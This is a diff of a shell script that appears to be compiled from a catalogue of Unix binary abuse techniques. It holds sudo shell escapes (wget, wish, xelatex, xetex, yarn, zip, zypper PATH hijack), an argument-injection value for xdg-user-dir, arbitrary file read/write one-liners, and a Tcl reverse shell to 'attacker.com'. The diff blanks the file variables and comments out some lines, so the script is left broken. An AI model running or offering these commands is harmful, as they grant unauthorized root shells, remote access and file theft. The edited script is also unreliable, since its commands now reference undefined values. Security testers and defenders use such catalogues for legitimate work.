 echo DATA > $TF
 wget -i $TF -o $LFILE
@@ -3007,11 +3013,11 @@ TF=$(mktemp)
 chmod +x $TF
 echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
 sudo wget --use-askpass=$TF 0
-LFILE=file_to_read
+
 whiptail --textbox --scrolltext "$LFILE" 0 0
-LFILE=file_to_read
+
 ./whiptail --textbox --scrolltext "$LFILE" 0 0
-LFILE=file_to_read
+
 sudo whiptail --textbox --scrolltext "$LFILE" 0 0
 RHOST=attacker.com
 RPORT=12345
@@ -3036,7 +3042,7 @@ After starting Wireshark, and waiting for the capture to begin, deliver the UDP 
 2. right-click on "Data" from the "Packet Details" pane, and select "Export Packet Bytes...";
 3. choose where to save the packet dump.
 PORT=4444
-sudo wireshark -c 1 -i lo -k -f "udp port $PORT" &
+#sudo wireshark -c 1 -i lo -k -f "udp port $PORT" &
 echo 'DATA' | nc -u 127.127.127.127 "$PORT"
 wish
 exec /bin/sh <@stdin >@stdout 2>@stderr
@@ -3045,10 +3051,10 @@ export RPORT=12345
 echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish
 sudo wish
 exec /bin/sh <@stdin >@stdout 2>@stderr
-xargs -Ix sh -c 'exec sh 0<&1'
-x^D^D
-LFILE=file_to_read
-xargs -a "$LFILE" -0
+#xargs -Ix sh -c 'exec sh 0<&1'
+#x^D^D
+
+#xargs -a "$LFILE" -0
 xdg-user-dir '}; /bin/sh #'
 sudo xdg-user-dir '}; /bin/sh #'
 xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
@@ -3061,40 +3067,40 @@ sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\w
 xetex --shell-escape '\write18{/bin/sh}\end'
 sudo xetex --shell-escape '\write18{/bin/sh}\end'
 ./xetex --shell-escape '\write18{/bin/sh}\end'
-LFILE=file_to_read
+
 xmodmap -v $LFILE
-LFILE=file_to_read
+
 ./xmodmap -v $LFILE
-LFILE=file_to_read
+
 sudo xmodmap -v $LFILE
-LFILE=file_to_read
+
 xmore $LFILE
-LFILE=file_to_read
+
 ./xmore $LFILE
-LFILE=file_to_read
+
 sudo xmore $LFILE
-LFILE=file_to_read
+
 xpad -f "$LFILE"
-LFILE=file_to_read
+
 sudo xpad -f "$LFILE"
-LFILE=file_to_write
+
 echo DATA | xxd | xxd -r - "$LFILE"
-LFILE=file_to_read
+
 xxd "$LFILE" | xxd -r
-LFILE=file_to_read
+
 ./xxd "$LFILE" | xxd -r
-LFILE=file_to_read
+
 sudo xxd "$LFILE" | xxd -r
-LFILE=file_to_read
+
 xz -c "$LFILE" | xz -d
-LFILE=file_to_read
+
 ./xz -c "$LFILE" | xz -d
-LFILE=file_to_read
+
 sudo xz -c "$LFILE" | xz -d
 TF=$(mktemp -d)
 echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
 yarn --cwd $TF install
-LFILE=file_to_read
+
 yelp "man:$LFILE"
 RHOST=attacker.com
 RFILE=file_to_get.rpm
@@ -3144,15 +3150,15 @@ sudo rm $TF
 TF=$(mktemp -u)
 ./zip $TF /etc/hosts -T -TT 'sh #'
 sudo rm $TF
-export LFILE=file_to_read
+export 
 zsh -c 'echo "$(<$LFILE)"'
-export LFILE=file_to_write
+export 
 zsh -c 'echo DATA >$LFILE'
-LFILE=file_to_read
+
 zsoelim "$LFILE"
-LFILE=file_to_read
+
 ./zsoelim "$LFILE"
-LFILE=file_to_read
+
 sudo zsoelim "$LFILE"
 zypper x
 TF=$(mktemp -d)
@@ -3163,3 +3169,5 @@ sudo zypper x
 TF=$(mktemp -d)
 cp /bin/sh $TF/zypper-x
 sudo PATH=$TF:$PATH zypper x
+
+echo ">>>>>>>>>>>END OF SRCIPT!"
